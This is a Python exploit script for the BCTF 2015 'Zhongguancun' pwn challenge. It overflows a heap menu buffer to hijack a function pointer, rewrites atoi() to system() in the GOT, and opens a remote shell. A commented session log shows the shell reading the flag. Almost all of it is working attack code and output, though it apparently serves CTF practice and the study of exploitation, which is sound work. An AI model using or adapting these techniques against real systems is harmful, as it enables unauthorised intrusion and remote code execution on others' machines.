#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# BCTF 2015 - Zhongguancun (Pwn 450)
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib

# --------------------------------------------------------------------------------------------------
def recv_until(st):             # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(8192)
  return ret
# --------------------------------------------------------------------------------------------------
def interact( d, r ):
    s.send(d + '\n')
    return recv_until(r)

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":

    s = socket.create_connection(("146.148.60.107", 6666))
#   s = socket.create_connection(("localhost", 9999))

    jump_ptr    = 0x08049B74    
    money_ptr   = 0x0804B280
    atoi_got    = 0x0804B038-1                  # .got.plt:0804B038 off_804B038 dd offset atoi


    # The problem is in buffer the stores the generated menu. sprintf() can overflow the buffer. 
    # So we need to generate the menu first to allocate the buffer and then we need to register 
    # another item later. Thus the vulnerable buffer will overwrite the vtable function pointer. 
    print ' **** PHASE 1: registering items ****'   
    print '\t(this will take a bit...)'
    recv_until('choice?')

    interact('a',       'store?')               # register store
    interact('S'*0x3f,  'choice?')              # longest name
    
    for i in range(15):                         # register 15 items
        interact('a',           'name?')        # register phones
        interact('N'*0x1f,      'OS?')          # longest name
        interact('4',           'price?')       # Blackberry OS (type with longest name)
        interact('-1000000000', 'description?') # a loooong price :)
        interact('D'*0x4f,      'choice?')      # longest description
                            
    interact('c',   'choice?')                  # generate store menu
    
    # HEAP layout:
    # item1 --> item2 --> ... --> item15 --> print_buffer
    interact('a',           'name?')            # register last item
    interact('N'*0x1f,      'OS?')              # longest name
    interact('4',           'price?')           # Blackberry OS
    interact('2147483647', 'description?')      # price 0x7fffffff
    interact('D' + struct.pack("<I", atoi_got) + 'D'*0x46\
                 + struct.pack("<I", jump_ptr), 'choice?')


    print ' **** PHASE 2: overflowing function pointer ****'    
    # HEAP layout:
    # item1 --> item2 --> ... --> item15 --> print_buffer --> item16
    interact('c',   'choice?')                  # overflow function pointer of item16
    interact('d',   'choice?')                  # go back
    interact('b',   'buy?')                     # try store
    interact('16',  'choice?')                  # choose last item
    interact('b',   'buy?')                     # trigger function pointer


    '''
    Ok now we have overflowed the function pointer. The problem is that stupid check:
        .text:08048FDC                 push    esi
        .text:08048FDD                 call    read_dev_0_804897B ; if address is writeable exit
        .text:08048FE2                 pop     eax
        .text:08048FE3                 pop     edx
        .text:08048FE4                 mov     eax, [esi]
        .text:08048FE6                 push    edi             ; arg2: #items
        .text:08048FE7                 push    esi             ; arg1: address of item
        .text:08048FE8                 call    dword ptr [eax]

    Functions tries to read from read_dev_0_804897B and store it in esi. If read doesn't fail, then
    program exits. Practically if the jump address is writable, program exits. This doesn't leave
    us many choices. We can only jump to .text section. So let's jump on function 0x80492FE, and
    use the sprintf() to overwrite the money pointer at 0x804B280 
    '''
    print ' **** PHASE 3: tampering money pointer ****' 
    interact(str(money_ptr - 0x40 + 0x7),   'choice?')  # set arg to 0x80492FE

    # now money ptr points to atoi  
    interact( 'a',  'buy?')                     # buy it    


    # Now moneyptr points to atoi in GOT. By setting the right price for the product and we buy
    # the proper quantity (by overflowing then it's possible to add the displacement between atoi()
    # and system(), so we can change atoi() to system(). 
    # This instruction:
    #   .text:08048F79                 js      loc_8049008     ; check for underflow
    # Checks if the resulted price is negative. Because libc is located at address >0xf000000, we
    # have to go 1 step back and make ptr to point to atoi()-1 in GOT. The MSByte will be the same
    # so we can bypass this trick
    print ' **** PHASE 4: changing atoi() to system() in GOT ****'  
    # LOCAL:  system F7CFB190  ---  atoi   F7CEC860
    # REMOTE: system 0003ADA0  ---  atoi   0002D160
    system = 0x3ada0
    atoi   = 0x2d160
    nbuy   = (system-atoi) * 256

    print '\tsystem 0x%08x\tatoi 0x%08x' % (system, atoi)
    print '\tatoi - price*buy = 0x%08x' % ((atoi - 2147483647*nbuy) & 0xffffffff)

    interact( str(nbuy), 'choice?')             # change atoi() andress


    # now, atoi points to system
    print ' **** PHASE 5: triggering system() ****'     

    interact( 'a','buy?')
    s.send('/bin/sh' + '\n')


    print ' **** PHASE 6: opening shell ****'
    t = telnetlib.Telnet()          # open shell
    t.sock = s
    t.interact()
    exit(0)

# --------------------------------------------------------------------------------------------------
'''
ispo@nogirl ~/bctf $ python zhongguancun_exploit.py 
 **** PHASE 1: registering items ****
 **** PHASE 2: overflowing function pointer ****
 **** PHASE 3: tampering money pointer ****
 **** PHASE 4: changing atoi() to system() in GOT ****
    system 0x0003ada0   atoi 0x0002d160
    atoi - price*buy = 0x00df1160
 **** PHASE 5: triggering system() ****
 **** PHASE 6: opening shell ****
whoami 
    zhongguancun
pwd
    /home/zhongguancun
ls -la
    total 44
    drwxr-x--- 3 root zhongguancun  4096 Mar 21 01:29 .
    drwxr-xr-x 3 root root          4096 Mar 21 01:28 ..
    -rw-r--r-- 1 root zhongguancun    21 Jun 11  2014 .bash_logout
    -rw-r--r-- 1 root zhongguancun    57 Jun 11  2014 .bash_profile
    -rw-r--r-- 1 root zhongguancun   141 Jun 11  2014 .bashrc
    drwxr-xr-x 2 root zhongguancun  4096 Mar 21 01:28 apps
    -r--r----- 1 root zhongguancun    50 Mar 21 01:27 flag
    -rwxr-x--- 1 root zhongguancun 14132 Mar 20 14:08 zhongguancun
cat flag
    BCTF{h0w_could_you_byp4ss_vt4ble_read0nly_ch3cks}
exit
'''
# --------------------------------------------------------------------------------------------------
